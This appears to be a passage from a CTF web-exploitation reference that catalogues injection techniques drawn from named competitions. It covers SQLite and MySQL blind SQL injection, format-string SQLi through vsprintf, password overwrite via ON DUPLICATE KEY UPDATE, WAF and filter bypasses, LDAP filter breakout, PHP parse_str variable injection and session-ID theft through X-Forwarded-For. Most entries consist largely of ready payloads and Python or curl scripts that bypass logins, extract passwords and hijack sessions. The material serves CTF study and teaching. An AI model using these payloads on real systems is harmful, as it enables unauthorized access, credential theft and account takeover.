**Pattern:** SQLite has no `SLEEP()` function. Use `randomblob(N)` as a time-based blind injection primitive -- generating a large random blob creates a measurable delay proportional to the argument size.

```sql
-- Basic time-based blind test: if the condition is true, randomblob() introduces delay
admin' and 1=randomblob(300000000)--

-- Character-by-character password extraction via LIKE:
admin' and password like 'f%' and 1=randomblob(300000000)--
admin' and password like 'fl%' and 1=randomblob(300000000)--
admin' and password like 'fla%' and 1=randomblob(300000000)--
admin' and password like 'flag%' and 1=randomblob(300000000)--
```

```python
import requests
import time
import string

url = "http://target/login"
known = ""

for pos in range(32):
    for c in string.ascii_lowercase + string.digits + "_{}":
        payload = f"admin' and password like '{known}{c}%' and 1=randomblob(300000000)--"
        start = time.time()
        requests.post(url, data={"username": payload, "password": "x"})
        elapsed = time.time() - start
        if elapsed > 2.0:  # threshold: randomblob(300M) takes ~2-3 seconds
            known += c
            print(f"Found: {known}")
            break
```

**Key insight:** `randomblob()` generates random data proportional to the argument size, creating measurable delays. This is the SQLite equivalent of MySQL's `SLEEP()` or PostgreSQL's `pg_sleep()`. Adjust the argument (e.g., `300000000`) based on server performance to get a reliable timing difference. Other SQLite delay alternatives include `zeroblob()` and recursive CTEs, but `randomblob()` is the most reliable.

---

## vsprintf Double-Prepare Format String SQLi (AceBear 2018)

**Pattern:** When user input passes through `vsprintf()` twice (once for formatting, once for query building), format specifiers like `%1$c` in the first pass produce characters that bypass string-level escaping. The integer `39` converts to ASCII `'` (single quote) via `%c`, defeating `mysqli_real_escape_string`.

```text
# Attack parameters:
username=39&password=%1$c+or+1=1--+-

# Server-side processing:
# 1. Input is escaped: mysqli_real_escape_string has nothing to escape in "39" or "%1$c or 1=1-- -"
# 2. vsprintf processes the query template:
#    vsprintf("SELECT * FROM users WHERE user='%1$c or 1=1-- -' AND pass='%s'", [39, ...])
# 3. %1$c converts argument 39 → chr(39) → ' (single quote)
# 4. Result: WHERE user='' or 1=1-- -' AND pass='...'
#    → authentication bypass
```

```python
import requests

# Step 1: Bypass login
r = requests.post("http://target/login", data={
    "username": "39",
    "password": "%1$c or 1=1-- -"
})

# Step 2: Extract data with UNION
r = requests.post("http://target/login", data={
    "username": "39",
    "password": "%1$c union select 1,group_concat(flag),3 from flags-- -"
})
```

**Key insight:** `%c` in `vsprintf` converts an integer to a character, bypassing string-level escaping. If user input passes through `vsprintf` twice (once for formatting, once for query building), format specifiers in the first input become SQL injection vectors in the second pass. The key trick is sending `39` as one parameter (ASCII code for single quote) and `%1$c` as another to reference that parameter as a character. Look for PHP code that chains `sprintf`/`vsprintf` with query construction.

---

### SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)

**Pattern:** When you can inject into an INSERT statement but SELECT is revoked, use MySQL's `ON DUPLICATE KEY UPDATE` clause to overwrite an existing user's password. The clause triggers when the INSERT would violate a UNIQUE constraint, updating the existing row instead.

```sql
-- Vulnerable INSERT:
INSERT INTO users (id, username, password) VALUES ('', 'USER_INPUT', 'PASS_INPUT')

-- Injection in username field:
'),('','root','z')ON DUPLICATE KEY UPDATE password='l'#

-- Resulting query:
INSERT INTO users (id, username, password) VALUES ('', ''),('','root','z')ON DUPLICATE KEY UPDATE password='l'#', 'PASS_INPUT')
-- This inserts a row for 'root' and when the UNIQUE constraint on username conflicts,
-- it updates the existing root user's password to 'l'
```

```python
import requests

# Overwrite the root user's password via ON DUPLICATE KEY UPDATE
payload_username = "'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#"
r = requests.post("http://target/register", data={
    "username": payload_username,
    "password": "anything"
})

# Now login as root with the overwritten password
r = requests.post("http://target/login", data={
    "username": "root",
    "password": "hacked"
})
print(r.text)
```

**Key insight:** MySQL's `ON DUPLICATE KEY UPDATE` clause in INSERT statements can modify existing rows when a UNIQUE constraint conflicts, enabling password overwrite without SELECT privileges. This is particularly useful when the database user has INSERT but not SELECT permissions, making traditional UNION-based extraction impossible. Look for registration or user creation endpoints with injectable INSERT queries.

---

### MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)

**Pattern:** When a WAF blocks access to `information_schema`, use `mysql.innodb_table_stats` to enumerate database and table names. This system table contains metadata about InnoDB tables and is often not included in WAF rules.

```sql
-- Direct query (if not blind):
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()

-- Also available:
SELECT group_concat(database_name) FROM mysql.innodb_table_stats
```

```python
# Boolean-based blind extraction via innodb_table_stats:
import requests
import string

def blind_extract(url):
    result = ""
    for pos in range(1, 100):
        found = False
        for char in string.ascii_lowercase + string.digits + "_,":
            payload = (
                "'or(if(1,(select(substr((select(group_concat(table_name))"
                f" from mysql.innodb_table_stats where database_name=database()),{pos},1))"
                f"='{char}'),1)=1)#"
            )
            r = requests.post(url, data={"input": payload})
            if "success" in r.text:  # adjust oracle condition
                result += char
                found = True
                print(f"[+] Extracted so far: {result}")
                break
        if not found:
            break
    return result

tables = blind_extract("http://target/search")
print(f"Tables: {tables}")
```

**Other WAF-bypass metadata sources:**
```sql
-- mysql.innodb_table_stats: database_name, table_name
-- mysql.innodb_index_stats: database_name, table_name, index_name
-- sys.schema_table_statistics: table_schema, table_name (MySQL 5.7+)
-- sys.x$schema_table_statistics: same, less formatting
```

**Key insight:** `mysql.innodb_table_stats` contains `database_name` and `table_name` columns, providing an alternative metadata source when `information_schema` access is filtered by WAF rules. Unlike `information_schema`, it only tracks InnoDB tables (not column names), so combine with error-based or blind techniques to discover column names after finding tables.

---

## SQLi Inline Comment Multi-Field Split (picoCTF 2018)

**Pattern:** A regex filter checks the username field but leaves the password field unfiltered. Start a MySQL inline comment `/*` in username and close it `*/` in password, splitting the injection across two fields so no single field triggers the filter alone.

```text
# Vulnerable query (after PHP concatenation):
SELECT * FROM users WHERE name='<username>' AND password='<password>'

# Payload:
username = '/*
password = */ OR 1=1 --

# Final query MySQL sees:
SELECT * FROM users WHERE name='/*' AND password='*/ OR 1=1 -- '
# After comment removal:
SELECT * FROM users WHERE name=' OR 1=1 -- '
```

```python
import requests
r = requests.post("http://target/login", data={
    "username": "'/*",
    "password": "*/ OR 1=1 -- "
})
```

**Key insight:** MySQL `/* ... */` comments span across string delimiters and field boundaries when the filter runs before interpolation, not after. Any validator that checks one field at a time misses the full injected string. When a blocklist hits the username regex but the password field is rendered into the same query, split payloads across both inputs.

**References:** picoCTF 2018 — THE VAULT, writeup 11747

---

## PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)

**Pattern:** PHP regex `/^\d+＄/` uses the Unicode full-width dollar sign (`＄`, U+FF04) instead of ASCII `$`. PCRE treats the full-width character as a literal, so there is no end-of-string anchor and the match succeeds even with trailing garbage.

```php
// Vulnerable check
if (preg_match('/^\d+＄/', $input)) { /* accepted */ }

// Payload passes validation and later triggers long-string handling
$_GET['key2'] = '1337＄' . str_repeat('a', 50);
```

```bash
curl "http://target/?key2=1337%EF%BC%84$(python3 -c 'print("a"*50)')"
```

**Key insight:** Always compare regex special characters by codepoint, not by appearance. Unicode look-alikes of `$`, `^`, `.`, `[`, `]`, `*`, `+`, `?`, `(`, `)` are literals in PCRE and silently downgrade the pattern. Check every anchor in a filter with `hexdump -C` before trusting it.

**References:** Hack.lu CTF 2018 — Baby PHP, writeup 11846

---

## MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)

**Pattern:** WAF blocks `|`, `-`, `\`, `#`, `and`, `if`, `where`, `concat`, `insert`, `having`, and `sleep`, but leaves `REGEXP` and backtick identifiers alone. Use backtick-delimited comments `/**/` as space replacement and `REGEXP` as a Boolean oracle that matches an anchored prefix character-by-character. A trailing null byte terminates the query in old PHP/MySQL pairs and drops the surrounding single-quote.

```text
# Blacklist (partial): | - \ ( ) # and if database where concat insert having sleep

# Oracle query:
/?user=`\`&pw=`||pw/**/REGEXP/**/%22^1%22;%00

# Iteratively extend the regex prefix:
^1 → ^17 → ^172 → ^1729 ...
```

```python
import requests, string
URL = "http://target/"
prefix = ""
charset = string.ascii_letters + string.digits + "{}_"
while True:
    for c in charset:
        pw = f"`||pw/**/REGEXP/**/\"^{prefix+c}\";\x00"
        r = requests.get(URL, params={"user": "`\\`", "pw": pw})
        if "Welcome" in r.text:
            prefix += c
            print(prefix)
            break
    else:
        break
```

**Key insight:** `REGEXP` is rarely on a WAF keyword list and supports anchors (`^`, `$`) and character classes, giving a full byte-by-byte oracle without `AND`, `IF`, or `SUBSTRING`. Backticked column references bypass space stripping because `/**/` comments separate tokens without spaces. Null bytes after the payload truncate the SQL string early in MySQL clients that still honor embedded NULs.

**References:** BSides Delhi CTF 2018 — Old School SQL, writeup 11953

---

## LDAP Filter Breakout with Wildcard Injection (CSAW 2018)

**Pattern:** An LDAP search filter `(&(GivenName=<input>)(!(GivenName=Flag)))` interpolates user input without escaping parentheses or wildcards. Inject `*))(|(uid=*` to close the first clause, open a disjunction, and match every entry — including the blocked `Flag` account.

```text
# Original filter
(&(GivenName=Alice)(!(GivenName=Flag)))

# Injected input: *))(|(uid=*
# Resulting filter
(&(GivenName=*))(|(uid=*)(!(GivenName=Flag)))

# The `&` now only sees (GivenName=*), and the trailing disjunction + leftover
# negation become ignored extra filter components.
```

```python
import requests
r = requests.get("http://target/search", params={"name": "*))(|(uid=*"})
print(r.text)
```

**Key insight:** LDAP filters use a prefix-notation boolean tree: `&` / `|` / `!` followed by parenthesised children. Unescaped user input that contains `)`, `(`, `*`, or `\` lets the attacker rebalance that tree. Common payloads: `*)(uid=*` (OR wildcard), `*))(&(1=1)` (force true), `foo)(|(password=*)`  (enumerate records). Escape with `\28`, `\29`, `\2a`, `\5c` on the server side.

**References:** CSAW CTF Qualification Round 2018 — ldab, writeup 11207

---

## PHP parse_str() Variable Injection (TokyoWesterns 2018)

**Pattern:** PHP's `parse_str($str)` — called without a result array — writes every key in the query string as a local variable in the current scope. Attacker-controlled keys overwrite authentication variables such as `$hashed_password` that the script compares against a precomputed hash.

```php
// Vulnerable
parse_str($_SERVER['QUERY_STRING']);  // $hashed_password ← attacker input
if (md5($password) === $hashed_password) { login(); }

// Safe form
parse_str($_SERVER['QUERY_STRING'], $params);
```

```bash
# Set the target variable directly from the query string
curl "http://target/auth.php?action=auth&password=anything&hashed_password=$(php -r 'echo md5("anything");')"
```

**Key insight:** `parse_str()` and `extract()` are register_globals-style primitives: any parameter sent by the client becomes a PHP variable that might shadow logic the developer assumed was local. The fix is always the two-argument form. When auditing PHP, grep for `parse_str\(\s*\$[^,]*\)` with no comma.

**References:** TokyoWesterns CTF 4th 2018 — SimpleAuth, writeup 11034

---

## ExpressionEngine FileManager ORDER BY Sort-Key SQLi (35C3 2018)

**Pattern:** ExpressionEngine's file-manager endpoint takes a `tbl_sort` array from the client and passes each `[column, direction]` pair directly to `$db->order_by($key, $val)`. Column names are concatenated into SQL with no allowlist, so the attacker controls an `ORDER BY` expression.

```http
POST /cp/tbl_sort[0][]=(select if(substr(user_password,1,1)='a',sleep(5),0) from exp_members) tbl_sort[0][]=ASC
```

Use `sleep()` / `benchmark()` inside the sort expression to run a blind timing oracle on the admin password hash.

**Key insight:** Any ORM that lets the client pick sort columns must allowlist them. The attack is particularly nasty because `ORDER BY` subqueries are rarely caught by WAFs that focus on `SELECT`/`UNION` keywords.

**References:** 35C3 CTF 2018 — ExpressionEngine filemanager SQLi, writeup 12880

---

## SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)

**Pattern:** A session initializer builds `SELECT ... FROM nxf8_sessions WHERE ip_address = '<X-Forwarded-For>'` and copies the resulting row into the `PHPSESSID` cookie. The value of the last column of your UNION row becomes the cookie — a free one-shot exfiltration channel. The error message `unrecognized token` reveals SQLite; enumerate with `sqlite_master`.

```bash
# Discover column count (4 columns in this table)
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,null from nxf8_users where '1'='1"

# Leak table definitions from sqlite_master
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,sql from sqlite_master where tbl_name='nxf8_users' and type='table"

# Exfiltrate a specific row (session_id for user 5)
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,session_id from nxf8_sessions where user_id=5 and '1'='1"
# -> Set-Cookie: PHPSESSID=<leaked value>
```
Pad with `null` columns until the UNION fits; place the target expression in the column whose value is reflected in the cookie. Reuse the leaked `session_id` as your own `PHPSESSID` to impersonate the target user (e.g., Maria).

**Key insight:** Session-ID generation logic often includes unsanitized HTTP headers (`X-Forwarded-For`, `Client-IP`, `True-Client-IP`). The reflected row becomes a free oracle: no error-based or time-based inference required. SQLite-specific UNION uses `null` padding and `sqlite_master(type,name,tbl_name,sql)` for schema enumeration (no `information_schema`).

**References:** Quals Saudi and Oman National Cyber Security CTF 2019 — Maria, writeup 13236

---

## Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)

**Pattern:** Application blocks the word `UNION` but naively looks for `" UNION "` (space-delimited). The SQL lexer treats a closing quote as a token boundary, so `'UNION` is still parsed as the keyword `UNION` after the string literal closes. Placing `UNION` flush against the closing quote slips past the string filter while the parser still accepts it.

```sql
-- Original: SELECT items FROM Search WHERE items='<input>';
-- Blocked (filter sees " UNION "):
aggies' UNION SELECT 1; #

-- Bypass (no space before UNION — filter sees "UNION" embedded in word "aggies'UNION"):
aggies'UNION SELECT 1; #

-- Drop the string prefix entirely:
'UNION SELECT @@VERSION #
'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema!='information_schema' #
'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema!='information_schema' #
'UNION ALL SELECT grantee FROM information_schema.user_privileges #
```

**Key insight:** Naive blacklists look for whitespace-delimited keywords, but SQL lexers tolerate quote-adjacent tokens — the closing `'` is implicit whitespace to the parser. The same trick works for `/*!50000UNION*/`, tab/newline (`%09`, `%0a`), parentheses (`UNION(SELECT...)`), and comment blocks (`UNION/**/SELECT`). Also probe `information_schema.user_privileges` for the `grantee` column — CTF authors often hide flags as the privileged user's name.

**References:** TAMUctf 2019 — Bird Box Challenge, writeup 13860

---
